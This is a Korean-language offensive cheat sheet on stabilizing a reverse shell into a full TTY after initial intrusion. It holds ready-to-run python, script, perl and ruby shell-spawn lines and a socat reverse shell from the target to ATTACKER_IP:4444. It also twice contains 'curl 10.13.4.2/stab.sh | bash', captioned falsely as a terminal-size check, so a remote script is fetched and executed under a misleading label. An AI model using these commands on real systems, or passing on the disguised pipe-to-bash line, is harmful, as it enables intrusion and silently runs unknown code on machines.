

# TTY 셸 안정화 가이드

리버스 셸 등으로 시스템에 처음 접속하면, 일반적으로 기능이 매우 제한적인 'Dumb Shell' 상태가 됩니다. 이 상태에서는 `Tab` 자동 완성, 명령어 히스토리, `Ctrl+C`를 통한 프로세스 중단 등이 동작하지 않아 정상적인 작업이 어렵습니다. 

이 문서는 Dumb Shell을 완전한 기능의 TTY(Teletype) 셸로 업그레이드하는 단계별 절차를 안내합니다. 이 작업은 **초기 침투 후 가장 먼저 수행해야 할 필수 과정**입니다.

---

### **Pretty colors**
```bash
# shell stabilization (pretty colors :))
cat /etc/shells
PS1='[\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]]\$ '
```

---


### **1단계: PTY Shell 생성 (기본 업그레이드)**

가장 먼저, Python(또는 다른 스크립트 언어)을 이용해 기본적인 PTY(Pseudo-Terminal)를 생성합니다. 이것만으로도 셸의 기능이 일부 개선됩니다.

```bash title="Python을 이용한 PTY 셸 생성"
# 시스템에 설치된 Python 버전에 맞게 시도
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
```

> **팁:** 만약 Python이 없다면 `script` 명령어나 다른 언어(perl, ruby)를 활용할 수 있습니다.


`script` : 보통 리눅스에 기본 설치 되어 있음.
```bash
script /dev/null -c /bin/bash
# 또는
script -qc /bin/bash /dev/null
```

`socat` : `socat`이 설치되어 있다면 가장 강력하고 안정적인 셸을 얻을 수 있음. 공격자 PC에서 리스너를 열고, 타겟 서버에서 접속하는 방식.
```bash title="Attacker_Kali (리스너)"
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

```bash title="Target (접속)"
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

`기타 스크립트 언어` 
```bash
# Perl
perl -e 'exec "/bin/sh";'

# Ruby
ruby -e 'exec "/bin/sh"'
```

---


### **2단계: Shell 환경 완전 안정화 (Full TTY Stabilization)**

PTY 셸을 생성한 후, 다음 절차를 통해 로컬 터미널과 동일한 환경으로 만듭니다.

#### **[1] 셸을 백그라운드로 전환**
- 현재 PTY  Shell에서 `Ctrl+Z`를 눌러 Shell을 잠시 백그라운드로 보냅니다.

#### **[2] 로컬 터미널 환경 설정**
- 공격자(로컬) 머신에서 다음 명령어를 입력하여 터미널을 'raw' 모드로 설정하고, 백그라운드의 셸을 다시 포어그라운드로 가져옵니다.

```bash(title="공격자 머신 (Kali)")
# 현재 터미널의 특수 문자 처리를 비활성화하고(raw), 입력 문자를 화면에 바로 표시하지 않도록(-echo) 설정
stty -a
stty raw -echo; fg
```

- `fg` 명령어를 입력하고 엔터를 두 번 정도 치면, 백그라운드에 있던 원격 Shell이 다시 활성화됩니다.

#### **[3] 원격 셸 환경 변수 설정**
- 이제 원격 셸은 안정화되었지만, 터미널 크기나 종류가 제대로 설정되지 않아 화면 출력이 깨질 수 있습니다. 다음 명령어로 환경을 최종 설정합니다.

```bash(title="원격 셸 (Target)")
# 터미널 종류를 xterm-256color로 설정 (가장 일반적)
export TERM=xterm-256color

# 로컬 터미널과 동일한 줄(rows)과 칸(cols) 크기로 설정
stty rows 38 cols 115
```

> **팁:** 로컬 터미널의 크기는 새 터미널을 열고 `stty -a` 명령어로 확인할 수 있습니다.

```bash title="this checks ur rows and columns in ur current shell"
curl 10.13.4.2/stab.sh | bash
```

---


### Shell 환경 개선

기본 셸(`sh`, `ash`)은 기능이 부족함. `bash`나 `zsh`가 설치되어 있는지 확인하고, 있다면 바로 실행하여 더 나은 환경에서 작업하는 것이 효율적.
```bash
# bash가 있는지 확인하고 실행
which bash && /bin/bash

# zsh가 있는지 확인하고 실행
which zsh && /bin/zsh
```

---

```bash title="this checks ur rows and columns in ur current shell"
curl 10.13.4.2/stab.sh | bash
```

### **최종 확인**

모든 과정이 완료되면, 이제 원격 셸에서 다음과 같은 기능들이 정상적으로 동작합니다:
- **명령어 히스토리:** 위/아래 화살표 키
- **자동 완성:** `Tab` 키
- **프로세스 중단:** `Ctrl+C`
- **화면 정리:** `clear` 명령어
- **인터랙티브 프로그램 실행:** `su`, `ssh`, `vim` 등

